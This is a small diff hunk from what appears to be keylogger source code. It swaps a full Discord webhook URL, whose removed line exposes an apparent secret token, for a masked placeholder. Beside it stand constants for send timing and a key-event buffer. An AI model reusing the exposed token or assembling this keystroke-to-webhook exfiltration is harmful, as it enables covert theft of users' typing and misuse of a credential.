@@ -37,7 +37,7 @@ MAX_TIME = 5
 SEND_TIME = 20
 
 # Discord webhook URL
-DISC_WB = 'https://discord.com/api/webhooks/1349645375513952298/8ZCMY9gSuJGlOEakBih5tpY_PBztN5pNp_k3PurM4KB1WM0agBgLJv-ecM3VOJSjHd-7'
+DISC_WB = 'https://discord.com/api/webhooks/***********/************************'
 
 # Buffer that logs key events.
 BUFF_SZ = 256
